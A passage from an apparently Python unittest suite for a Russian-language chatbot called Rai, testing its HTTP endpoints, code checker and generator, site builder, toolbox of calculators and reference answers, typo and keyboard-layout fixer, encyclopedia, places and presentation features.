        self.assertIsNone(cities.find("Березино"))
        fake_net.calls.clear()
        r = self.ask("какая погода в минске?")
        self.assertIn("Минск, Беларусь", r["answer"])
        self.assertFalse(any("geocoding" in c for c in fake_net.calls))  # город из справочника — без лишнего запроса

    def test_programming_languages(self):
        self.assertIn("```go", self.ask("hello world на go")["answer"])
        self.assertIn("**Rust**", self.ask("что такое rust")["answer"])
        self.assertIn("**C#**", self.ask("что такое c#")["answer"])
        self.assertIn("Языки программирования", self.ask("какие языки программирования ты знаешь")["answer"])
        import proglangs
        self.assertGreaterEqual(len(proglangs.LANGUAGES), 45)
        # короткие названия («c», «r») только в явном контексте
        self.assertIsNone(proglangs.find_language("у меня есть r и c"))


class HttpTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        rai_app.brain = Brain(learned_path=os.path.join(self.tmp.name, "learned.json"))
        self.client = rai_app.app.test_client()

    def tearDown(self):
        self.tmp.cleanup()

    def test_index_page(self):
        resp = self.client.get("/")
        self.assertEqual(resp.status_code, 200)
        self.assertIn(b"<title>Rai", resp.data)
        # Формы входа в самой странице нет (они на login.php хостинга); есть вкладка Code
        self.assertNotIn(b"authDialog", resp.data)
        self.assertIn(b'src="code.js"', resp.data)
        resp.close()

    def test_standalone_build(self):
        import re
        import build_standalone
        html = build_standalone.build()
        self.assertNotIn('src="code.js"', html)
        self.assertIn("window.RaiCode", html)
        self.assertIn("window.RaiNeuro", html)  # нейросеть в браузере встроена в страницу
        self.assertIn("window.RaiPptx", html)  # экспорт в PowerPoint тоже
        scripts = re.findall(r"<script\b[^>]*>(.*?)</script>", html, re.S)
        # «<!--» внутри <script> ломает разбор страницы
        self.assertFalse(any("<!--" in s for s in scripts))
        payload = re.search(r'<script type="application/json" id="rai-files">(.*?)</script>', html, re.S).group(1)
        files = json.loads(payload)
        self.assertIn("codeai.py", files)
        self.assertIn("codelib.py", files)
        # сборка для хостинга только с PHP и HTML: Python и распознавание — с CDN
        cdn = build_standalone.build(cdn=True)
        self.assertNotIn('"pyodide/",', cdn)
        self.assertIn("window.RAI_OCR_LOCAL = false", cdn)
        self.assertIn("webgen.py", cdn)

    def test_versions_endpoint(self):
        data = self.client.get("/api/versions").get_json()
        self.assertEqual([v["id"] for v in data["versions"]], list(VERSIONS))

    def test_chat_js_compatible(self):
        resp = self.client.post("/rai.php", json={"message": "Привет"})
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertTrue(data["answer"])
        self.assertEqual(data["version"], "pro")

    def test_version_in_path_body_and_form(self):
        self.assertEqual(self.client.post("/api/chat/pro-sun", json={"message": "x"}).get_json()["version"], "pro-sun")
        body = {"message": "x", "version": "Pro Fast"}
        self.assertEqual(self.client.post("/api/chat", json=body).get_json()["version"], "pro-fast")
        self.assertEqual(self.client.post("/rai", data=body).get_json()["version"], "pro-fast")

    def test_errors(self):
        r = self.client.post("/api/chat", json={"message": "x", "version": "ultra"})
        self.assertEqual(r.status_code, 400)
        self.assertIn("answer", r.get_json())
        self.assertEqual(self.client.post("/api/chat", json={"message": " "}).status_code, 400)

    def test_teach_requires_token(self):
        body = {"patterns": ["пароль от wifi"], "answer": "Спросите у админа."}
        with mock.patch.dict(os.environ, {"RAI_ADMIN_TOKEN": ""}):
            self.assertEqual(self.client.post("/api/teach", json=body).status_code, 403)
        with mock.patch.dict(os.environ, {"RAI_ADMIN_TOKEN": "secret"}):
            self.assertEqual(self.client.post("/api/teach", json=body).status_code, 403)
            ok = self.client.post("/api/teach", json=body, headers={"X-Rai-Token": "secret"})
            self.assertEqual(ok.status_code, 200)
        answer = self.client.post("/api/chat", json={"message": "пароль от wifi"}).get_json()["answer"]
        self.assertEqual(answer, "Спросите у админа.")



class CodeAITest(unittest.TestCase):
    BUGGY = ('import os\nage = input("Возраст? ")\nif age > 18\n    print "взрослый"\n'
             'for i in range(len(items)):\n    print(nme)\n')

    def test_syntax_error_in_russian(self):
        import codeai
        issues = codeai.check_python(self.BUGGY)
        self.assertEqual(issues[0]["severity"], "error")
        self.assertIn("двоеточия", issues[0]["message"])
        self.assertEqual(issues[0]["line"], 3)

    def test_fix_then_deep_check(self):
        import codeai
        fixed, changes = codeai.fix_python(self.BUGGY)
        self.assertIn("if age > 18:", fixed)
        self.assertIn('print("взрослый")', fixed)
        self.assertEqual(len(changes), 2)
        messages = " ".join(i["message"] for i in codeai.check_python(fixed))
        self.assertIn("input() возвращает строку", messages)
        self.assertIn("«items» нигде не определено", messages)
        self.assertIn("«os» импортировано, но не используется", messages)
        hint = next(i["hint"] for i in codeai.check_python("name = 1\nprint(nme)") if "nme" in i["message"])
        self.assertIn("«name»", hint)

    def test_explain_and_comment(self):
        import codeai
        code = "def square(x):\n    return x * x\n\nfor i in range(3):\n    print(square(i))\n"
        text = codeai.explain(code)
        self.assertIn("объявляет функцию square(x)", text)
        self.assertIn("перебирает числа от 0 до 3", text)
        commented = codeai.comment_python(code)
        self.assertIn("# Объявляет функцию square(x)", commented)
        compile(commented, "x.py", "exec")  # комментарии не ломают код

    def test_other_languages(self):
        import codeai
        lang, issues = codeai.check_code("function f() {\n  if (a == 1) {\n    return 1;\n}\n", None)
        self.assertEqual(lang, "javascript")
        self.assertTrue(any("не закрыта" in i["message"] for i in issues))
        lang, issues = codeai.check_code("<!DOCTYPE html><html><body><div><p>x</body></html>", None)
        self.assertTrue(any("<div> не закрыт" in i["message"] for i in issues))
        lang, issues = codeai.check_code('{"a": 1,}', "json")
        self.assertEqual(issues[0]["severity"], "error")

    def test_generate(self):
        import codeai
        import codelib
        r = codeai.chat("напиши игру змейка")
        self.assertEqual((r["lang"], r["filename"]), ("html", "index.html"))
        self.assertIn("<canvas", r["code"])
        self.assertEqual(codeai.chat("калькулятор на c++")["lang"], "cpp")
        self.assertEqual(codeai.chat("напиши сортировку")["filename"], "main.py")
        self.assertIsNone(codeai.chat("что такое html?"))
        self.assertIsNone(codeai.chat("как дела"))
        for key, t in codelib.T.items():  # весь Python в библиотеке синтаксически верный
            if "python" in t["codes"]:
                compile(t["codes"]["python"], key, "exec")

    def test_code_in_chat_and_api(self):
        tmp = tempfile.TemporaryDirectory()
        brain = Brain(learned_path=os.path.join(tmp.name, "l.json"))
        quasar = VERSIONS["pro-quasar"]
        r = brain.answer(quasar, "найди ошибку:\n```python\nfor i in range(3)\n    print(i)\n```")
        self.assertEqual(r["intent"], "code")
        self.assertIn("двоеточия", r["answer"])
        r = brain.answer(quasar, "напиши игру крестики нолики")
        self.assertEqual(r["attachments"][0]["type"], "code")
        self.assertIn("Pro Quasar", brain.answer(PRO, "напиши игру змейка")["answer"])
        client = rai_app.app.test_client()
        data = client.post("/api/code", json={"action": "fix", "code": "if x == None\n    pass\n"}).get_json()
        self.assertIn("if x is None:", data["code"])
        tmp.cleanup()



class BuildersTest(unittest.TestCase):
    """Сайты по описанию, новые программы и функции."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.brain = Brain(learned_path=os.path.join(self.tmp.name, "l.json"))
        self.q = VERSIONS["pro-quasar"]

    def tearDown(self):
        self.tmp.cleanup()

    def code_of(self, text, session="b1"):
        r = self.brain.answer(self.q, text, session)
        att = [a for a in r["attachments"] if a["type"] == "code"]
        return r, (att[0] if att else None)

    def test_site_spec(self):
        import webgen
        spec = webgen.new_spec("сайт кофейни зерно в тёмных тонах, меню: капучино 190, латте 220. почта z@z.ru")
        self.assertEqual((spec["type"], spec["title"], spec["theme"]), ("cafe", "Зерно", "dark"))
        menu = next(s for s in spec["sections"] if s["kind"] == "menu")
        self.assertEqual(menu["items"][1], {"title": "Латте", "price": "220 ₽", "text": ""})
        self.assertEqual(spec["contacts"]["email"], "z@z.ru")
        # «сервис» — не серый цвет, «работы» — не бот
        self.assertEqual(webgen.new_spec("сайт автосервиса «Мотор»")["accent"], "#e10600")
        self.assertEqual(webgen.new_spec("сайт с разделами: о нас, наши работы")["type"], "business")
        html = webgen.render(spec)
        self.assertEqual(webgen.spec_from_html(html)["title"], "Зерно")
        spec2, done = webgen.edit_spec(spec, "добавь раздел цены")
        self.assertIn("Цены", [s["title"] for s in spec2["sections"]])
        self.assertIsNone(webgen.edit_spec(spec, "непонятная просьба")[1])

    def test_site_in_chat_and_edits(self):
        r, att = self.code_of("сделай сайт кофейни зерно")
        self.assertTrue(att and att["site"] and att["filename"] == "index.html")
        r, att = self.code_of("добавь раздел цены")
        self.assertIn("Сделано", r["answer"])
        self.assertIn("Цены", att["code"])
        r, att = self.code_of("сделай синим")
        self.assertIn("#1e5bff", att["code"])

    def test_site_about_topic_uses_knowledge(self):
        r, att = self.code_of("сделай сайт про python", "b2")
        self.assertIn("Python", att["code"])
        self.assertNotIn("Оставьте заявку", att["code"])

    def test_programs(self):
        for text, title in [("напиши игру тетрис", "Тетрис"), ("сделай приложение погоды", "Приложение погоды"),
                            ("сделай конвертер валют", "Конвертер валют"), ("калькулятор ИМТ", "Калькулятор ИМТ"),
                            ("напиши функцию которая считает среднее списка", "Среднее арифметическое"),
                            ("шифр цезаря на javascript", "Шифр Цезаря"), ("напиши бота для дискорда", "Discord-бот")]:
            r, att = self.code_of(text, "p-" + text)
            self.assertTrue(att, text)
            self.assertEqual(att["title"], title)
        # вопросы остаются вопросами
        self.assertEqual(self.brain.answer(self.q, "таблица умножения на 7", "x")["intent"], "skill")
        self.assertNotEqual(self.brain.answer(self.q, "прогноз погоды", "x")["intent"], "code")

    def test_generated_functions_run(self):
        import contextlib
        import io
        import funcgen
        for _, title, python, _ in funcgen.F:
            with contextlib.redirect_stdout(io.StringIO()):
                exec(compile(python, title, "exec"), {"__name__": "__main__"})

    def test_code_api_edit(self):
        import webgen
        html = webgen.render(webgen.new_spec("сайт пекарни"))
        data = rai_app.app.test_client().post("/api/code", json={"action": "edit", "code": html, "prompt": "убери отзывы"}).get_json()
        self.assertIn("убрал раздел", data["answer"])
        self.assertNotIn(">Отзывы<", data["code"])


class ScreenTest(unittest.TestCase):
    """Текст со скриншота или записи экрана: вопросы, варианты ответов, примеры, код."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.brain = Brain(learned_path=os.path.join(self.tmp.name, "l.json"))
        self.q = VERSIONS["pro-quasar"]

    def tearDown(self):
        self.tmp.cleanup()

    def test_questions_options_and_math(self):
        text = "Реши [[screen]]\n1. Столица Франции?\nа) Берлин\n6) Париж\n2. Сколько будет 12 * 7 =\nВычисли 2^10"
        r = self.brain.answer(self.q, text, "s")
        self.assertEqual(r["intent"], "screen")
        self.assertIn("**Ответ:** Париж", r["answer"])
        self.assertIn("= 84", r["answer"])
        self.assertIn("= 1024", r["answer"])

    def test_code_and_empty(self):
        r = self.brain.answer(self.q, "[[screen]]\ndef f(x)\n    return x*2", "s")
        self.assertIn("Код на скриншоте", r["answer"])
        self.assertIn("двоеточия", r["answer"])
        self.assertIn("не нашёл текста", self.brain.answer(self.q, "[[screen]]\n@# ~", "s")["answer"])

    def test_long_screen_text_allowed(self):
        long = "[[screen]]\n" + "Это длинный текст с экрана. " * 400
        self.assertEqual(self.brain.answer(self.q, long, "s")["intent"], "screen")


class ToolboxTest(unittest.TestCase):
    """100+ точных функций: математика, деньги, здоровье, время, текст, генераторы, справочник, игры."""

    def setUp(self):
        import toolbox
        import facts  # noqa: F401
        import games  # noqa: F401
        self.toolbox = toolbox
        self.tmp = tempfile.TemporaryDirectory()
        self.brain = Brain(learned_path=os.path.join(self.tmp.name, "learned.json"))

    def tearDown(self):
        self.tmp.cleanup()

    def run_tool(self, text):
        return self.toolbox.run(text, {}) or ""

    def test_every_tool_answers_its_example(self):
        tools = self.toolbox.TOOLS
        self.assertGreaterEqual(len(tools), 100)
        for t in tools:
            low = self.toolbox.skills._low(t["example"])
            self.assertTrue(t["fn"](t["example"], low, {}), t["title"])
            owner = next(u for u in tools if u["fn"](t["example"], low, {}))
            self.assertEqual(owner["title"], t["title"], t["example"])  # пример не перехватывает другая функция
        self.assertIn("## Мои функции: ", self.toolbox.catalog())

    def test_math(self):
        r = self.run_tool
        self.assertIn("x₁ = 3, x₂ = 2", r("реши уравнение x^2 - 5x + 6 = 0"))
        self.assertIn("x = 5", r("реши уравнение 3x + 7 = 22"))
        self.assertIn("x₁ = 1/2, x₂ = -2", r("реши уравнение 2х^2 + 3х - 2 = 0"))
        self.assertIn("действительных корней нет", r("реши уравнение x^2 + 1 = 0"))
        self.assertIn("простое", r("97 простое число?"))
        self.assertIn("составное", r("является ли 91 простым числом"))
        self.assertIn("2 × 2 × 2 × 3 × 3 × 5", r("разложи 360 на множители"))
        self.assertIn("= 12", r("нод 48 и 180"))
        self.assertIn("= 60", r("нок чисел 12 и 15"))
        self.assertIn("3628800", r("факториал 10"))
        self.assertIn("= 610", r("15-е число фибоначчи"))
        self.assertIn("= 4", r("кубический корень из 64"))
        self.assertIn("= 10", r("log2 1024"))
        self.assertIn("= 0,5", r("синус 30 градусов"))
        self.assertIn("FF", r("переведи 255 в шестнадцатеричную"))
        self.assertIn("1101", r("переведи 13 в двоичную систему"))
        self.assertIn("MCMXCIV", r("1994 римскими цифрами"))
        self.assertIn("= 14", r("XIV арабскими"))
        self.assertIn("сто двадцать три тысячи четыреста пятьдесят шесть", r("123456 прописью"))
        self.assertIn("Две тысячи двадцать один рубль 05 копеек", r("2021,05 рублей прописью"))
        self.assertIn("78,5398", r("площадь круга радиус 5"))
        self.assertIn("**6**", r("площадь треугольника со сторонами 3 4 5"))
        self.assertIn("**5**", r("гипотенуза катеты 3 и 4"))
        self.assertIn("= 3", r("медиана 1 3 2 8 5"))
        self.assertIn("5/6", r("1/2 + 1/3 дробью"))
        self.assertIn("≈ 2,6", r("округли 2,567 до десятых"))
        self.assertIn("25%", r("сколько процентов 30 от 120"))

    def test_money_health_time(self):
        r = self.run_tool
        self.assertIn("11 122,22 ₽", r("кредит 500000 под 12% на 5 лет"))
        self.assertIn("133 100 ₽", r("вклад 100000 под 10% на 3 года"))
        self.assertIn("1 700 ₽", r("2000 со скидкой 15%"))
        self.assertIn("20 000 ₽", r("выделить ндс 20% из 120000"))
        self.assertIn("87 000 ₽", r("зарплата 100000 на руки"))
        self.assertIn("962,50 ₽", r("счёт 3500 на 4 человек чаевые 10%"))
        self.assertIn("23,1 — норма", r("имт рост 180 вес 75"))
        self.assertEqual(r("калькулятор ИМТ"), "")  # просьба о программе — не расчёт
        self.assertIn("190", r("пульсовые зоны 30 лет"))
        self.assertIn("23:15", r("во сколько лечь спать если вставать в 7:00"))
        self.assertIn("Телец", r("знак зодиака 5 мая"))
        self.assertIn("Крысы", r("китайский гороскоп 2008"))
        self.assertIn("XIX", r("какой век 1812 год"))
        self.assertIn("29 дней", r("сколько дней в феврале 2028"))
        self.assertIn("Токио", r("который час в Токио"))

    def test_text_and_generators(self):
        r = self.run_tool
        self.assertIn("Ivanov Petr", r("транслит Иванов Пётр"))
        self.assertIn("привет мир", r("исправь раскладку ghbdtn vbh"))
        self.assertIn("... --- ...", r("азбукой морзе SOS"))
        self.assertIn("SOS", r("расшифруй морзе ... --- ..."))
        self.assertIn("палиндром", r("шалаш палиндром?"))
        self.assertIn("тулезх", r("зашифруй шифром цезаря привет сдвиг 3"))
        self.assertIn("привет", r("расшифруй цезаря тулезх сдвиг 3"))
        self.assertEqual(r("шифр цезаря на javascript"), "")  # это программа для генератора кода
        self.assertIn("0L/RgNC40LLQtdGC", r("base64 привет"))
        self.assertIn("5d41402abc4b2a76b9719d911017c592", r("md5 hello"))
        self.assertIn("#FF0080", r("rgb(255, 0, 128) в hex"))
        self.assertIn("8-я буква", r("какая по счёту буква ж"))

    def test_reference(self):
        r = self.run_tool
        self.assertIn("Au", r("химический символ золота"))
        self.assertIn("Толстой", r("кто написал войну и мир"))
        self.assertIn("Леонардо", r("кто нарисовал Мону Лизу"))
        self.assertIn("Чайковский", r("кто написал Щелкунчика"))
        self.assertIn("Белл", r("кто изобрёл телефон"))
        self.assertIn("1939", r("когда началась Вторая мировая война"))
        self.assertIn("1961", r("когда полетел гагарин"))
        self.assertIn("Эверест", r("самая высокая гора"))
        self.assertIn("299 792 458", r("скорость света"))
        self.assertIn("8 планет", r("сколько планет в солнечной системе"))
        self.assertIn("иена", r("какая валюта в Японии"))
        self.assertIn("+375", r("код страны Беларусь"))
        self.assertIn("португальский", r("на каком языке говорят в Бразилии"))
        self.assertIn("went", r("три формы глагола go"))

    def test_games_in_chat(self):
        v = VERSIONS["pro"]  # игры помнят ход даже в версии без памяти разговора
        ask = lambda t: self.brain.answer(v, t, session_id="game1")
        r = ask("загадай загадку")
        self.assertEqual(r["intent"], "game")
        self.assertIn("Ответ:", ask("сдаюсь")["answer"])
        ask("давай сыграем в угадай число")
        n = self.brain.sessions.get("play:game1")["game"]["n"]
        self.assertIn("Угадали", ask(str(n))["answer"])
        ask("давай викторину")
        quiz = self.brain.sessions.get("play:game1")["game"]
        for _ in range(5):
            import games
            right = games.QUIZ[quiz["order"][quiz["pos"]]][2]
            last = ask("абвг"[right])["answer"]
        self.assertIn("5 из 5", last)
        ask("давай в города")
        self.assertIn("Вам на", ask("Москва")["answer"])
        self.assertIn("окончена", ask("стоп")["answer"])
        self.assertEqual(ask("привет")["intent"], "greeting")  # игры больше нет — обычный разговор
        self.assertEqual(ask("все функции")["intent"], "tools_list")

    def test_no_hijack(self):
        q = VERSIONS["pro-quasar"]
        for text, intent in [("привет", "greeting"), ("сколько будет 2+2*2", "skill"), ("курс доллара", "currency"),
                             ("сделай игру змейка", "code"), ("придумай стих про осень", "poem"), ("мне грустно", "support"),
                             ("что такое фотосинтез", "glossary"), ("калькулятор ИМТ", "code")]:
            self.assertEqual(self.brain.answer(q, text, session_id="nh")["intent"], intent, text)


class FixerTest(unittest.TestCase):
    """Не та раскладка и опечатки: Rai понимает и отвечает на исправленное."""

    def setUp(self):
        import fixer
        self.fix = lambda t: fixer.fix(t)[0]
        self.tmp = tempfile.TemporaryDirectory()
        self.brain = Brain(learned_path=os.path.join(self.tmp.name, "learned.json"))

    def tearDown(self):
        self.tmp.cleanup()

    def test_layout(self):
        for typed, meant in [("ghbdtn", "привет"), ("ghbdtn rfr ltkf", "привет как дела"), ("gjujlf vbycr", "погода минск"),
                             ("crjkmrj ,eltn 2+2", "сколько будет 2+2"), ("Ghbdtn", "Привет"), ("погода vbycr", "погода минск"),
                             ("yfgbib rjl yf python", "напиши код на python"), ("руддщ цщкдв", "hello world")]:
            self.assertEqual(self.fix(typed), meant, typed)
        for keep in ("hello world", "how are you", "python", "ok", "google", "vk.com", "напиши код на python"):
            self.assertEqual(self.fix(keep), keep)

    def test_typos(self):
        for typed, meant in [("пагода в минске", "погода в минске"), ("сколко будет 2+2", "сколько будет 2+2"),
                             ("раскажи анекдот", "расскажи анекдот"), ("превет как дила", "привет как дела"),
                             ("что такое фатосинтез", "что такое фотосинтез"), ("здраствуй", "здравствуй"), ("спосибо", "спасибо")]:
            self.assertEqual(self.fix(typed), meant, typed)
        # правильные слова, сленг, имена, марки и «сырой» текст команд не трогаем
        for keep in ("кто такой илон маск", "тойота камри", "ваще норм", "скока стоит", "привет, Маша", "транслит Иванов Пётр",
                     "мой кот не ест корм", "как избавиться от тараканов", "морзе SOS", "base64 ghbdtn"):
            self.assertEqual(self.fix(keep), keep)
        import json
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "knowledge.json"), encoding="utf-8") as fh:
            for it in json.load(fh)["intents"]:
                for pattern in it["patterns"]:
                    self.assertEqual(self.fix(pattern), pattern)

    def test_brain_answers_fixed_text(self):
        q = VERSIONS["pro-quasar"]
        r = self.brain.answer(q, "gjujlf vbycr", session_id="fx")
        self.assertEqual((r["intent"], r["fixed"]), ("weather", "погода минск"))
        self.assertTrue(r["answer"].startswith("*Понял как: «погода минск»*"))
        r = self.brain.answer(q, "пагода в минске", session_id="fx")
        self.assertEqual(r["intent"], "weather")
        r = self.brain.answer(q, "привет", session_id="fx")
        self.assertIsNone(r["fixed"])
        self.assertNotIn("Понял как", r["answer"])


class EncyclopediaTest(unittest.TestCase):
    """Энциклопедия (~10 000 тем из Википедии): поиск по названию в любом падеже, разделы, подсказки нейросети."""

    DATA = {
        "sections": ["Люди", "История", "География", "Биология и медицина", "Естественные науки"],
        "cats": [[0, "Писатели"], [1, "Новое время"], [2, "Горы"], [3, "Млекопитающие"], [4, "Астрономия"], [2, "Города"]],
        "items": [
            ["Пушкин, Александр Сергеевич", "русский поэт", 0, "Александр Сергеевич Пушкин (1799—1837) — русский поэт.", ["Пушкин А. С."]],
            ["Великая французская революция", "революция во Франции", 1, "Великая французская революция — крупнейшая трансформация.", ["Французская революция"]],
            ["Джомолунгма", "высочайшая вершина Земли", 2, "Джомолунгма — высочайшая вершина Земли, 8848 м.", ["Эверест"]],
            ["Жираф", "вид млекопитающих", 3, "Жираф — парнокопытное млекопитающее, самое высокое животное.", []],
            ["Меркурий (планета)", "планета Солнечной системы", 4, "Меркурий — ближайшая к Солнцу планета.", []],
            ["Меркурий (мифология)", "римский бог", 1, "Меркурий — бог торговли в римской мифологии.", []],
            ["Москва", "столица России", 5, "Москва — столица России.", []],
        ],
    }

    def setUp(self):
        import encyclopedia
        self.enc = encyclopedia
        self.saved = (encyclopedia._data, encyclopedia._index)
        encyclopedia.load(self.DATA)

    def tearDown(self):
        self.enc._data, self.enc._index = self.saved

    def test_lookup_any_case(self):
        enc = self.enc
        for q, title in (("кто такой Пушкин", "Пушкин"), ("кто такой Александр Сергеевич Пушкин?", "Пушкин"),
                         ("расскажи о Пушкине", "Пушкин"), ("расскажи мне про великую французскую революцию", "революция"),
                         ("что ты знаешь о французской революции", "революция"), ("где находится Эверест", "Джомолунгма"),
                         ("что такое меркурий", "ближайшая к Солнцу"), ("Пушкин это кто", "Пушкин"), ("жираф — это что?", "Жираф")):
            r = enc.answer(q, explicit_only=True)
            self.assertIsNotNone(r, q)
            self.assertIn(title, r, q)
            self.assertIn("Википедии", r)  # источник в каждом ответе
        self.assertIn("Жираф", enc.answer("Жираф"))                 # просто название
        self.assertIsNone(enc.answer("Жираф", explicit_only=True))
        for q in ("кто такой лучший друг", "что такое любовь к жирафам и пушкину", "как дела", "погода в москве"):
            self.assertIsNone(enc.answer(q, explicit_only=True), q)
        self.assertIsNone(enc.answer("погода в москве"))

    def test_catalog_random_context(self):
        enc = self.enc
        cat = enc.answer("какие разделы ты знаешь")
        self.assertIn("7 тем", cat)
        self.assertIn("География", cat)
        self.assertIn("Источник", enc._render(enc._item(0)).replace("по материалам", "Источник"))
        self.assertIn("Википедии", enc.answer("случайная тема"))
        self.assertIn("Джомолунгма", enc.answer("темы раздела география"))
        ctx = enc.context("когда была великая французская революция и при чём тут Москва")
        self.assertEqual([c["title"] for c in ctx], ["Великая французская революция", "Москва"])
        self.assertTrue(ctx[0]["url"].startswith("https://ru.wikipedia.org/wiki/"))

    @unittest.skipUnless(os.path.exists(os.path.join(os.path.dirname(os.path.abspath(__file__)), "encyclopedia.json")), "нет encyclopedia.json")
    def test_real_data_and_standalone(self):
        import build_standalone
        self.enc.load()
        self.assertGreater(self.enc.count(), 1000)
        page = build_standalone.build()
        raw = page.split('<script type="application/json" id="rai-kb">', 1)[1].split("</script>", 1)[0]
        self.assertEqual(len(json.loads(raw)["items"]), self.enc.count())  # встроена в офлайн-версию целиком
        vis = page.split('<script type="application/json" id="rai-vision">', 1)[1].split("</script>", 1)[0]
        self.assertEqual(len(json.loads(vis)["labels"]), 502)  # и словарь зрения

    def test_brain_uses_encyclopedia(self):
        with tempfile.TemporaryDirectory() as tmp:
            brain = Brain(learned_path=os.path.join(tmp, "learned.json"))
            for v in (PRO, SUN):
                r = brain.answer(v, "кто такой Пушкин", session_id="e")
                self.assertEqual(r["intent"], "encyclopedia")
                self.assertIn("русский поэт", r["answer"])
            self.assertEqual(brain.answer(SUN, "Жираф", session_id="e")["intent"], "encyclopedia")
            self.assertEqual(brain.answer(SUN, "привет", session_id="e")["intent"], "greeting")
            self.assertNotEqual(brain.answer(SUN, "что такое python", session_id="e")["intent"], "encyclopedia")
            self.assertNotEqual(brain.answer(SUN, "сколько будет 2+2", session_id="e")["intent"], "encyclopedia")


class PlacesTest(unittest.TestCase):
    """Города и посёлки (население, достопримечательности, фото, погода), фото чего угодно, фото дня NASA."""

    def setUp(self):
        import encyclopedia
        self.enc = encyclopedia
        self.saved = (encyclopedia._data, encyclopedia._index)
        data = json.loads(json.dumps(EncyclopediaTest.DATA))
        data["items"][4].append(0)
        data["items"][4].append("Mercury in color.jpg")  # у Меркурия есть картинка
        encyclopedia.load(data)
        self.tmp = tempfile.TemporaryDirectory()
        self.brain = Brain(learned_path=os.path.join(self.tmp.name, "learned.json"))

    def tearDown(self):
        self.enc._data, self.enc._index = self.saved
        self.tmp.cleanup()

    def ask(self, text, v=None):
        return self.brain.answer(v or SUN, text, session_id="p")

    def test_requests(self):
        import places
        self.assertEqual(places.kind("расскажи о городе Гродно"), ("card", "Гродно"))
        self.assertEqual(places.kind("посёлок Малиновка"), ("card", "Малиновка"))
        self.assertEqual(places.kind("что посмотреть в Казани?"), ("sights", "Казани"))
        self.assertEqual(places.kind("достопримечательности Минска"), ("sights", "Минска"))
        self.assertEqual(places.kind("сколько жителей в Бресте"), ("population", "Бресте"))
        self.assertEqual(places.kind("население Новосибирска"), ("population", "Новосибирска"))
        for text in ("сколько людей живёт на земле", "расскажи о погоде", "привет"):
            self.assertIsNone(places.kind(text), text)
        self.assertEqual(places.photo_subject("покажи фото Марса"), "Марса")
        self.assertEqual(places.photo_subject("как выглядит галактика Андромеды"), "галактика Андромеды")
        self.assertFalse(places.is_photo_request("нарисуй картинку кота"))
        self.assertTrue(places.is_apod_request("покажи фото дня NASA"))

    def test_city_card(self):
        r = self.ask("расскажи о городе Казань")
        self.assertEqual(r["intent"], "place")
        a = r["answer"]
        for part in ("## Казань", "1 318 604 жителей (2024)", "местного времени", "Сейчас +12°", "Казанский кремль", "Мечеть Кул-Шариф", "Википедия"):
            self.assertIn(part, a)
        self.assertNotIn("Улица Баумана", a)  # улица — не достопримечательность
        photos = [x for x in r["attachments"] if x["type"] == "photo"]
        self.assertEqual(photos[0]["url"], "https://upload.wikimedia.org/kazan.jpg")
        self.assertGreaterEqual(len(photos), 3)
        sights = self.ask("что посмотреть в Казани")["answer"]
        self.assertIn("Что посмотреть: Казань", sights)
        self.assertIn("8,7 км от центра", sights)
        self.assertIn("1 318 604", self.ask("сколько жителей в Казани")["answer"])
        # место без статей рядом — честный ответ, а не выдумка
        none = self.ask("достопримечательности Малиновки Минского района")["answer"]
        self.assertIn("не нашёл статей", none)

    def test_photos_and_apod(self):
        r = self.ask("покажи фото Меркурия")
        self.assertEqual(r["intent"], "photo")
        urls = [x["url"] for x in r["attachments"] if x["type"] == "photo"]
        self.assertTrue(urls[0].startswith("https://commons.wikimedia.org/wiki/Special:FilePath/Mercury_in_color.jpg"))
        self.assertIn("ближайшая к Солнцу", r["answer"] + self.enc.answer("что такое Меркурий"))
        mars = self.ask("как выглядит Марс")
        self.assertIn("https://upload.wikimedia.org/mars.jpg", [x["url"] for x in mars["attachments"]])
        self.assertNotEqual(self.ask("нарисуй картинку кота")["intent"], "photo")
        apod = self.ask("фото дня NASA")
        self.assertIn("Фото дня NASA", apod["answer"])
        self.assertIn("[en|ru] The Andromeda Galaxy", apod["answer"])  # перевод заголовка
        self.assertEqual(apod["attachments"][0]["url"], "https://apod.nasa.gov/apod/image/andromeda.jpg")
        # энциклопедия прикладывает картинку темы
        enc = self.ask("что такое Меркурий")
        self.assertTrue(any(x["type"] == "photo" for x in enc["attachments"]))


class SlidesQualityTest(unittest.TestCase):
    """Презентация: оценка качества и переделка — мало материала или нет фото → текст с сайтов и фото из интернета."""

    def test_weak_deck_is_redone_with_web_material(self):
        import online
        import creative
        thin = {"title": "Тайга", "lead": "Тайга — хвойный лес.", "sections": [], "image": None,
                "link": "https://ru.wikipedia.org/wiki/Тайга", "lang": "ru"}
        sites = [{"title": "Тайга: природа и климат", "url": "https://example.ru/taiga", "text":
                  "Тайга занимает огромные пространства Евразии и Северной Америки. Зимы в тайге долгие и холодные, а лето короткое. "
                  "В тайге растут ель, пихта, сосна и лиственница. Животные тайги — бурый медведь, рысь, соболь и лось. "
                  "Почвы тайги бедные и кислые из-за хвои. Тайгу называют лёгкими планеты: она поглощает много углекислого газа."},
                 {"title": "Интересные факты о тайге", "url": "https://example.org/facts", "text":
                  "Тайга — самая большая природная зона на суше. В России тайга покрывает больше половины территории страны. "
                  "Лиственница сбрасывает хвою на зиму, в отличие от других хвойных деревьев. Лесные пожары в тайге случаются каждое лето. "
                  "Древесина тайги идёт на строительство и бумагу."}]
        photos = ["https://upload.wikimedia.org/taiga-%d.jpg" % i for i in range(6)]
        calls = []
        with tempfile.TemporaryDirectory() as tmp, \
                mock.patch.object(online, "wiki_page", lambda q, langs=("ru", "en"): thin), \
                mock.patch.object(online, "wiki_images", lambda t, lang="ru", limit=12: []), \
                mock.patch.object(online, "web_article", lambda q, langs=("ru", "en"): None), \
                mock.patch.object(online, "web_material", lambda q, pages=2, skip=(): calls.append(q) or [p for p in sites if p["url"] not in skip][:pages]), \
                mock.patch.object(online, "photos_for", lambda q, limit=12: photos):
            brain = Brain(learned_path=os.path.join(tmp, "learned.json"))
            r = brain.answer(SUN, "сделай презентацию про тайгу", session_id="s")
        deck = next(a for a in r["attachments"] if a["type"] == "slides")
        q = creative.deck_quality(deck, None, "photo")
        self.assertGreaterEqual(q["score"], 60)
        self.assertIn("переделал", r["answer"])
        self.assertIn("добавил текст из интернета", r["answer"])
        self.assertIn("нашёл ещё фото", r["answer"])
        text = json.dumps(deck["slides"], ensure_ascii=False)
